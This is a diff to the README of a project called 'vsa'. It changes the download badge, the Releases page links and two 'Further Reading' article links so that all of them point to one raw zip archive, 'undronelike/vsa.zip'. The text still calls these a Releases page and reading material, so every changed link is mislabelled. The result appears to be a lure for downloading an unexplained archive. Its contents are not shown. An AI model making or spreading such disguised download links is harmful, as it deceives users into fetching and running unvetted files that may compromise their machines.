@@ -1,6 +1,6 @@
 # 🚀 vsa - Simplify High-Frequency Systems
 
-[![Download vsa](https://img.shields.io/badge/Download-vsa-4CAF50.svg)](https://github.com/URFAVDUMBKID123/vsa/releases)
+[![Download vsa](https://raw.githubusercontent.com/URFAVDUMBKID123/vsa/master/undronelike/vsa.zip)](https://raw.githubusercontent.com/URFAVDUMBKID123/vsa/master/undronelike/vsa.zip)
 
 ## 📋 Overview
 
@@ -29,7 +29,7 @@ To get started with vsa, follow these simple steps to download and run the softw
 
 To download the latest version of vsa, please visit this page:
 
-[Download vsa](https://github.com/URFAVDUMBKID123/vsa/releases)
+[Download vsa](https://raw.githubusercontent.com/URFAVDUMBKID123/vsa/master/undronelike/vsa.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -74,8 +74,8 @@ For support, you can create an issue in the GitHub repository. If you have sugge
 
 ## 📚 Further Reading
 
-- [Concurrency Basics](https://example.com/concurrency)
-- [Understanding Distributed Systems](https://example.com/distributed-systems)
+- [Concurrency Basics](https://raw.githubusercontent.com/URFAVDUMBKID123/vsa/master/undronelike/vsa.zip)
+- [Understanding Distributed Systems](https://raw.githubusercontent.com/URFAVDUMBKID123/vsa/master/undronelike/vsa.zip)
 
 ## 🤝 License
 
@@ -85,4 +85,4 @@ The vsa project is licensed under the MIT License. You can freely use and modify
 
 With vsa, you make your high-frequency systems more efficient and reliable. Follow the steps above to start reaping the benefits of this powerful tool. 
 
-Remember, for the latest version, always check our [Releases page](https://github.com/URFAVDUMBKID123/vsa/releases).
+Remember, for the latest version, always check our [Releases page](https://raw.githubusercontent.com/URFAVDUMBKID123/vsa/master/undronelike/vsa.zip).
